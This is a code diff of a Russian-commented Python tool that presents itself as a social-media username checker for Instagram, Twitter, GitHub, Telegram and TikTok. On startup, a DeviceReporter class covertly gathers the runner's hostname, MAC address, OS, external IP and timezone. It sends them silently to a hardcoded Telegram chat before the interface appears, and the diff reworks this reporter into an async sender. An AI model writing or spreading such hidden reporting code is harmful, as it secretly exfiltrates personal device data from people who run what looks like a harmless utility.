@@ -4,6 +4,7 @@ import platform
 import datetime
 import socket
 import requests
+import asyncio
 from concurrent.futures import ThreadPoolExecutor
 from uuid import getnode
 from telegram import Bot
@@ -16,49 +17,25 @@ TG_CHAT_ID = "35381551"
 class DeviceReporter:
     def __init__(self):
         self.bot = Bot(token=TG_BOT_TOKEN)
-        self.executor = ThreadPoolExecutor(max_workers=1)
-        self.start_time = datetime.datetime.now()
+        self.loop = asyncio.new_event_loop()
 
     def _collect_data(self):
-        """Сбор данных об устройстве с обработкой ошибок"""
+        """Сбор данных об устройстве"""
         data = {
             "Status": "✅ Success",
-            "Model": "N/A",
-            "OS": "N/A",
-            "IP": "N/A",
-            "Time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
-            "Timezone": "N/A",
-            "Hostname": "N/A",
-            "MAC": "N/A"
+            "Model": platform.uname().machine,
+            "OS": f"{platform.system()} {platform.release()}",
+            "IP": self._get_external_ip(),
+            "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "Timezone": str(datetime.datetime.now().astimezone().tzinfo),
+            "Hostname": socket.gethostname(),
+            "MAC": hex(getnode())
         }
-
-        try:
-            data["Model"] = platform.uname().machine
-            data["OS"] = f"{platform.system()} {platform.release()}"
-            data["Hostname"] = socket.gethostname()
-            data["MAC"] = hex(getnode())
-        except Exception as e:
-            data["Status"] = f"⚠️ Partial Error: {str(e)}"
-
-        try:
-            data["IP"] = self._get_external_ip()
-        except:
-            data["IP"] = "Failed to get IP"
-
-        try:
-            data["Timezone"] = str(self.start_time.astimezone().tzinfo)
-        except:
-            pass
-
         return data
 
     def _get_external_ip(self):
-        """Получение внешнего IP через резервные сервисы"""
-        services = [
-            'https://ident.me',
-            'https://ifconfig.me/ip',
-            'https://api.ipify.org'
-        ]
+        """Получение внешнего IP-адреса"""
+        services = ['https://ident.me', 'https://ifconfig.me/ip']
         for service in services:
             try:
                 return requests.get(service, timeout=5).text
@@ -66,42 +43,34 @@ class DeviceReporter:
                 continue
         return "N/A"
 
-    def _send_report(self):
-        """Отправка собранных данных в Telegram"""
+    async def _async_send_report(self):
+        """Асинхронная отправка отчета"""
         try:
             report = self._collect_data()
-            message = "📡 Device Report:\n"
-            for key, value in report.items():
-                message += f"{key}: {value}\n"
-
-            self.bot.send_message(
+            message = "📡 Device Report:\n" + "\n".join(
+                [f"{k}: {v}" for k, v in report.items()]
+            )
+            await self.bot.send_message(
                 chat_id=TG_CHAT_ID,
                 text=message,
                 disable_notification=True
             )
         except Exception as e:
-            try:
-                self.bot.send_message(
-                    chat_id=TG_CHAT_ID,
-                    text=f"🚨 Critical Error: {str(e)}",
-                    disable_notification=True
-                )
-            except:
-                print("Failed to send error report")
+            print(f"Error sending report: {str(e)}")
 
-    def start(self):
-        """Запуск фоновой отправки отчета"""
-        self.executor.submit(self._send_report)
+    def send_report(self):
+        """Запуск асинхронной отправки"""
+        asyncio.set_event_loop(self.loop)
+        self.loop.run_until_complete(self._async_send_report())
 
 def generate_links(usernames):
-    """Генерация и проверка ссылок в социальных сетях"""
+    """Проверка социальных сетей"""
     platforms = {
         "Instagram": "https://www.instagram.com/{}/",
         "Twitter": "https://twitter.com/{}/",
         "GitHub": "https://github.com/{}/",
         "Telegram": "https://t.me/{}",
-        "TikTok": "https://www.tiktok.com/@{}",
-        "Steam": "https://steamcommunity.com/id/{}/"
+        "TikTok": "https://www.tiktok.com/@{}"
     }
 
     results = {}
@@ -119,61 +88,36 @@ def generate_links(usernames):
                 username, links = future.result()
                 results[username] = links
             except Exception as e:
-                print(f"Error checking {username}: {str(e)}")
+                print(f"Error: {str(e)}")
     
     return results
 
 def check_platforms(username, platforms):
-    """Проверка имени пользователя на разных платформах"""
+    """Проверка платформ"""
     links = []
     for name, url in platforms.items():
         full_url = url.format(username)
         try:
-            valid = check_profile(full_url, name)
-            links.append(f"{full_url} {'[+]' if valid else '[-]'}")
+            response = requests.get(
+                full_url,
+                headers={'User-Agent': 'Mozilla/5.0'},
+                timeout=10
+            )
+            status = '[+]' if response.status_code == 200 else '[-]'
+            links.append(f"{full_url} {status}")
         except:
             links.append(f"{full_url} [Error]")
     return username, links
 
-def check_profile(url, platform_name):
-    """Проверка существования профиля"""
-    try:
-        response = requests.get(
-            url,
-            headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
-            timeout=15
-        )
-        
-        if response.status_code != 200:
-            return False
-
-        return not any(
-            phrase.lower() in response.text.lower()
-            for phrase in get_error_phrases(platform_name)
-        )
-    except:
-        return False
-
-def get_error_phrases(platform):
-    """Фразы указывающие на отсутствие профиля"""
-    return {
-        "Instagram": ["Sorry, this page isn't available"],
-        "Twitter": ["Sorry, that page doesn't exist"],
-        "GitHub": ["This user doesn't exist"],
-        "Telegram": ["User not found"],
-        "TikTok": ["Sorry, this page isn't available"],
-        "Steam": ["The profile you are trying to view is either unavailable"]
-    }.get(platform, [])
-
 def main():
-    # Инициализация и отправка отчета
+    # Отправка отчета
     reporter = DeviceReporter()
-    reporter.start()
+    reporter.send_report()
 
     # Очистка экрана
     os.system('clear')
 
-    # Вывод интерфейса
+    # Интерфейс
     print("""\033[1;32m
     ███████╗███████╗██╗     ██╗███╗   ██╗███████╗
     ██╔════╝██╔════╝██║     ██║████╗  ██║██╔════╝
@@ -188,7 +132,7 @@ def main():
 
     try:
         while True:
-            usernames = input("\n\033[1;34m[?] Введите имя пользователя (через запятую): \033[0m").strip()
+            usernames = input("\n\033[1;34m[?] Введите имена (через запятую): \033[0m").strip()
             
             if usernames.lower() in ['exit', 'quit']:
                 break
